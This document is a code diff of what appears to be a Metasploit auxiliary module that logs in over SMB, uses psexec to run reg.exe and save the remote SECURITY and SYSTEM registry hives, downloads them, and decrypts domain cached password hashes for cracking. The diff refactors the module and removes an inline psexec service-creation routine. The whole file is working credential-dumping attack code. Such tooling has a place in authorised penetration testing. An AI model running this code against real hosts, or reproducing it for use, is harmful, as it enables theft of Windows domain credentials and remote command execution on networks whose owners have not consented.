@@ -1,4 +1,3 @@
-#!/usr/bin/env ruby
 require 'msf/core'
 require 'rex/registry'
 require 'fileutils'
@@ -8,10 +7,14 @@ class Metasploit3 < Msf::Auxiliary
 	# Exploit mixins should be called first
 	include Msf::Exploit::Remote::DCERPC
 	include Msf::Exploit::Remote::SMB
+	include Msf::Exploit::Remote::SMB::Psexec
 	include Msf::Exploit::Remote::SMB::Authenticated
-
 	include Msf::Auxiliary::Report
 	include Msf::Auxiliary::Scanner
+	# Aliases for common classes
+	SIMPLE = Rex::Proto::SMB::SimpleClient
+	XCEPT = Rex::Proto::SMB::Exceptions
+	CONST = Rex::Proto::SMB::Constants
 
 	def initialize
 		super(
@@ -34,6 +37,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options([
 			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
+			OptString.new('WINPATH', [true, 'The name of the WINDOWS directory on the remote host', 'WINDOWS']),
 			OptString.new('LOGDIR', [true, 'This is a directory on your local attacking system used to store Hive files and hashes', '/tmp/msfhashes/cached']),
 			OptString.new('RPORT', [true, 'The Target port son', 445]),
 		], self.class)
@@ -69,10 +73,11 @@ class Metasploit3 < Msf::Auxiliary
 			"Additional Groups"
 		])
 
-		secpath = "#{Rex::Text.rand_text_alpha(20)}"
-		syspath = "#{Rex::Text.rand_text_alpha(20)}"
+		secpath = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(20)}"
+		syspath = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(20)}"
 		hives = [secpath, syspath]
-		smbshare = datastore['SMBSHARE']
+		@smbshare = datastore['SMBSHARE']
+		@ip = ip
 		logdir = datastore['LOGDIR']
 
 		if connect
@@ -80,17 +85,17 @@ class Metasploit3 < Msf::Auxiliary
 			begin
 				smb_login
 			rescue StandardError => autherror
-				print_error("#{ip} - #{autherror}")
+				print_error("#{peer} - #{autherror}")
 				return
 			end
-			if save_reg_hives(ip, secpath, syspath)
-				d = download_hives(smbshare, ip, syspath, secpath, logdir)
-				sys, sec = open_hives(logdir, ip)
+			if save_reg_hives(secpath, syspath)
+				d = download_hives(syspath, secpath, logdir)
+				sys, sec = open_hives(logdir)
 				if d
-					dump_cache_creds(sec, sys, ip, credentials)
+					dump_cache_creds(sec, sys, credentials)
 				end
 			end
-			cleanup_after(ip, secpath, syspath)
+			cleanup_after([secpath, syspath])
 			disconnect
 		end
 	end
@@ -99,15 +104,14 @@ class Metasploit3 < Msf::Auxiliary
 
 	# This method attempts to use reg.exe to generate copies of the SYSTEM, and SECURITY registry hives
 	# and store them in the Windows Temp directory on the remote host
-	def save_reg_hives(ip, secpath, syspath)
-		print_status("Creating hive copies on #{ip}")
+	def save_reg_hives(secpath, syspath)
+		vprint_status("#{peer} - Creating hive copies on #{peer}")
 		begin
 			# Try to save the hive files
-			command = "%COMSPEC% /C reg.exe save HKLM\\SECURITY %WINDIR%\\Temp\\#{secpath} /y && reg.exe save HKLM\\SYSTEM %WINDIR%\\Temp\\#{syspath} /y"
-			out = psexec(command)
-			return true
+			command = "%COMSPEC% /C reg.exe save HKLM\\SECURITY #{secpath} /y && reg.exe save HKLM\\SYSTEM #{syspath} /y"
+			return psexec(command)
 		rescue StandardError => saveerror
-			print_error("#{ip} - Unable to create hive copies. #{saveerror}")
+			print_error("#{peer} - Unable to create hive copies. #{saveerror}")
 			return false
 		end
 	end
@@ -116,22 +120,22 @@ class Metasploit3 < Msf::Auxiliary
 
 	# Method used to copy hive files from C:\WINDOWS\Temp* on the remote host
 	# To the local file path specified in datastore['LOGDIR'] on attacking system
-	def download_hives(smbshare, ip, syspath, secpath, logdir)
-		print_status("#{ip} - Downloading SYSTEM and SECURITY hive files.")
+	def download_hives(syspath, secpath, logdir)
+		vprint_status("#{peer} - Downloading SYSTEM and SECURITY hive files.")
 		begin
-			newdir = "#{logdir}/#{ip}"
+			newdir = "#{logdir}/#{peer}"
 			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
-			simple.connect("\\\\#{ip}\\#{smbshare}")
+			simple.connect("\\\\#{@ip}\\#{@smbshare}")
 
 			# Get contents of hive file
-			remotesec = simple.open("\\WINDOWS\\Temp\\#{secpath}", 'rob')
-			remotesys = simple.open("\\WINDOWS\\Temp\\#{syspath}", 'rob')
+			remotesec = simple.open("#{secpath}", 'rob')
+			remotesys = simple.open("#{syspath}", 'rob')
 			secdata = remotesec.read
 			sysdata = remotesys.read
 
 			# Save it to local file system
-			localsec = File.open("#{logdir}/#{ip}/sec", "wb+")
-			localsys = File.open("#{logdir}/#{ip}/sys", "wb+")
+			localsec = File.open("#{logdir}/#{@ip}/sec", "wb+")
+			localsys = File.open("#{logdir}/#{@ip}/sys", "wb+")
 			localsec.write(secdata)
 			localsys.write(sysdata)
 
@@ -139,10 +143,10 @@ class Metasploit3 < Msf::Auxiliary
 			localsys.close
 			remotesec.close
 			remotesys.close
-			simple.disconnect("\\\\#{ip}\\#{smbshare}")
+			simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
 			return true
 		rescue StandardError => copyerror
-			print_error("#{ip} - Unable to download hive copies from. #{copyerror}")
+			print_error("#{peer} - Unable to download hive copies from. #{copyerror}")
 			return false
 		end
 	end
@@ -150,47 +154,52 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	# This method should hopefully open up a hive file from yoru local system and allow interacting with it
-	def open_hives(path, ip)
+	def open_hives(path)
 		begin
-			print_status("#{ip} - Opening hives on the local Attack system")
-			sys = Rex::Registry::Hive.new("#{path}/#{ip}/sys")
-			sec = Rex::Registry::Hive.new("#{path}/#{ip}/sec")
+			vprint_status("#{peer} - Opening hives on the local Attack system")
+			sys = Rex::Registry::Hive.new("#{path}/#{@ip}/sys")
+			sec = Rex::Registry::Hive.new("#{path}/#{@ip}/sec")
 			return sys, sec
 		rescue StandardError => openerror
-			print_error("#{ip} - Unable to open hives.  May not have downloaded properly. #{openerror}")
+			print_error("#{peer} - Unable to open hives.  May not have downloaded properly. #{openerror}")
 			return nil, nil
 		end
 	end
 
 
-
-	# This method runs the cleanup commands that delete the SYSTEM and SECURITY hive copies from the WINDOWS\Temp
-	# directory on the target host
-	def cleanup_after(ip, secpath, syspath)
-		print_status("Running cleanup on #{ip}")
-		begin
-			# Try and do cleanup
-			cleanup = "%COMSPEC% /C del /F /Q %WINDIR%\\Temp\\#{secpath} && del /F /Q %WINDIR%\\Temp\\#{syspath}"
-			out = psexec(cleanup)
-		rescue StandardError => cleanerror
-			print_error("Unable to run cleanup, need to manually remove hive copies from windows temp directory.")
-			print_error("#{cleanerror.class}: #{cleanerror}")
-			simple.disconnect(smbshare)
-			return cleanerror
+	# Removes files created during execution.
+	def cleanup_after(files)
+		simple.connect("\\\\#{@ip}\\#{@smbshare}")
+		vprint_status("#{peer} - Executing cleanup...")
+		files.each do |file|
+			begin
+				if smb_file_exist?(file)
+					smb_file_rm(file)
+				end
+			rescue Rex::Proto::SMB::Exceptions::ErrorCode => cleanuperror
+				print_error("#{peer} - Unable to cleanup #{file}. Error: #{cleanuperror}")
+			end
 		end
+		left = files.collect{ |f| smb_file_exist?(f) }
+		if left.any?
+			print_error("#{peer} - Unable to cleanup. Maybe you'll need to manually remove #{left.join(", ")} from the target.")
+		else
+			vprint_status("#{peer} - Cleanup was successful")
+		end
+		simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
 	end
 
 
 
 	# Extracts the Domain Cached hashes from the hive files
-	def dump_cache_creds(sec, sys, ip, credentials)
-		print_status("#{ip} - Extracting Domain Cached Password hashes.")
-		bootkey = get_boot_key(sys, ip)
-		lsa_key = get_lsa_key(sec, bootkey, ip)
-		nlkm = get_nlkm(sec, lsa_key, ip)
+	def dump_cache_creds(sec, sys, credentials)
+		vprint_status("#{peer} - Extracting Domain Cached Password hashes.")
+		bootkey = get_boot_key(sys)
+		lsa_key = get_lsa_key(sec, bootkey)
+		nlkm = get_nlkm(sec, lsa_key)
 		if bootkey && lsa_key && nlkm
 			begin
-				print_status("Dumping cached credentials...")
+				print_status("#{peer} - Dumping cached credentials...")
 				ok = sec.relative_query('\Cache')
 				john = ""
 				ok.value_list.values.each do |usr|
@@ -216,9 +225,8 @@ class Metasploit3 < Msf::Auxiliary
 						john += parse_decrypted_cache(dec_data, cache, credentials)
 					end
 				end
-				print_status("John the Ripper format:")
 				john.split("\n").each do |pass|
-					print_good("#{pass}  -  #{ip}")
+					print_good("#{pass}")
 				end
 				if( @vista == 1 )
 					vprint_status("Hash are in MSCACHE_VISTA format. (mscash2)")
@@ -226,17 +234,17 @@ class Metasploit3 < Msf::Auxiliary
 					vprint_status("Hash are in MSCACHE format. (mscash)")
 				end
 			rescue StandardError => e
-				print_status("No cached hashes found on #{ip}")
+				print_status("No cached hashes found on #{peer}")
 			end
 		else
-			print_error("#{ip} - Error obtaining LSA, NLKM, or Boot Key from SECURITY hive.")
+			print_error("#{peer} - System does not appear to store any cached credentials")
 			return
 		end
 	end
 
 
 	# Extract the NLKM value from the SECURITY hive using the Lsa key
-	def get_nlkm(sec, lsa_key, ip)
+	def get_nlkm(sec, lsa_key)
 		begin
 			nlkm = sec.relative_query('\Policy\Secrets\NL$KM\CurrVal').value_list.values[0].value.data
 			decrypted = decrypt_secret( nlkm[0xC..-1], lsa_key )
@@ -545,7 +553,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	# Code sampled from post/windows/gather/cachedump.rb
-	def get_lsa_key(sec, bootkey, ip)
+	def get_lsa_key(sec, bootkey)
 		begin
 			enc_reg_key = sec.relative_query('\Policy\PolSecretEncryptionKey')
 			obf_lsa_key = enc_reg_key.value_list.values[0].value.data
@@ -566,7 +574,6 @@ class Metasploit3 < Msf::Auxiliary
 				(1..1000).each do
 					md5x.update(obf_lsa_key[60,76])
 				end
-
 				rc4 = OpenSSL::Cipher::Cipher.new("rc4")
 				rc4.key = md5x.digest()
 				lsa_key	= rc4.update(obf_lsa_key[12,60])
@@ -582,7 +589,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	# Code sampled from post/windows/gather/cachedump.rb
-	def get_boot_key(hive, ip)
+	def get_boot_key(hive)
 		begin
 			vprint_status("Getting boot key")
 			vprint_status("Root key: #{hive.root_key.name}")
@@ -623,117 +630,4 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 
-
-	# This code was stolen straight out of psexec.rb.  Thanks very much HDM and all who contributed to that module!!
-	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
-	def psexec(command)
-
-		simple.connect("IPC$")
-
-		handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"])
-		vprint_status("#{peer} - Binding to #{handle} ...")
-		dcerpc_bind(handle)
-		vprint_status("#{peer} - Bound to #{handle} ...")
-
-		vprint_status("#{peer} - Obtaining a service manager handle...")
-		scm_handle = nil
-		stubdata =
-			NDR.uwstring("\\\\#{rhost}") + NDR.long(0) + NDR.long(0xF003F)
-		begin
-			response = dcerpc.call(0x0f, stubdata)
-			if dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil
-				scm_handle = dcerpc.last_response.stub_data[0,20]
-			end
-		rescue ::Exception => e
-			print_error("#{peer} - Error: #{e}")
-			return false
-		end
-
-		servicename = Rex::Text.rand_text_alpha(11)
-		displayname = Rex::Text.rand_text_alpha(16)
-		holdhandle = scm_handle
-		svc_handle = nil
-		svc_status = nil
-
-		stubdata =
-			scm_handle + NDR.wstring(servicename) + NDR.uwstring(displayname) +
-
-			NDR.long(0x0F01FF) + # Access: MAX
-			NDR.long(0x00000110) + # Type: Interactive, Own process
-			NDR.long(0x00000003) + # Start: Demand
-			NDR.long(0x00000000) + # Errors: Ignore
-			NDR.wstring( command ) +
-			NDR.long(0) + # LoadOrderGroup
-			NDR.long(0) + # Dependencies
-			NDR.long(0) + # Service Start
-			NDR.long(0) + # Password
-			NDR.long(0) + # Password
-			NDR.long(0) + # Password
-			NDR.long(0) # Password
-		begin
-			vprint_status("#{peer} - Creating the service...")
-			response = dcerpc.call(0x0c, stubdata)
-			if dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil
-				svc_handle = dcerpc.last_response.stub_data[0,20]
-				svc_status = dcerpc.last_response.stub_data[24,4]
-			end
-		rescue ::Exception => e
-			print_error("#{peer} - Error: #{e}")
-			return false
-		end
-
-		vprint_status("#{peer} - Closing service handle...")
-		begin
-			response = dcerpc.call(0x0, svc_handle)
-		rescue ::Exception
-		end
-
-		vprint_status("#{peer} - Opening service...")
-		begin
-			stubdata =
-				scm_handle + NDR.wstring(servicename) + NDR.long(0xF01FF)
-
-			response = dcerpc.call(0x10, stubdata)
-			if dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil
-				svc_handle = dcerpc.last_response.stub_data[0,20]
-			end
-		rescue ::Exception => e
-			print_error("#{peer} - Error: #{e}")
-			return false
-		end
-
-		vprint_status("#{peer} - Starting the service...")
-		stubdata =
-			svc_handle + NDR.long(0) + NDR.long(0)
-		begin
-			response = dcerpc.call(0x13, stubdata)
-			if dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil
-			end
-		rescue ::Exception => e
-			print_error("#{peer} - Error: #{e}")
-			return false
-		end
-
-		vprint_status("#{peer} - Removing the service...")
-		stubdata =
-			svc_handle
-		begin
-			response = dcerpc.call(0x02, stubdata)
-			if dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil
-		end
-			rescue ::Exception => e
-			print_error("#{peer} - Error: #{e}")
-		end
-
-		vprint_status("#{peer} - Closing service handle...")
-		begin
-			response = dcerpc.call(0x0, svc_handle)
-		rescue ::Exception => e
-			print_error("#{peer} - Error: #{e}")
-		end
-
-		select(nil, nil, nil, 1.0)
-		simple.disconnect("IPC$")
-		return true
-	end
 end
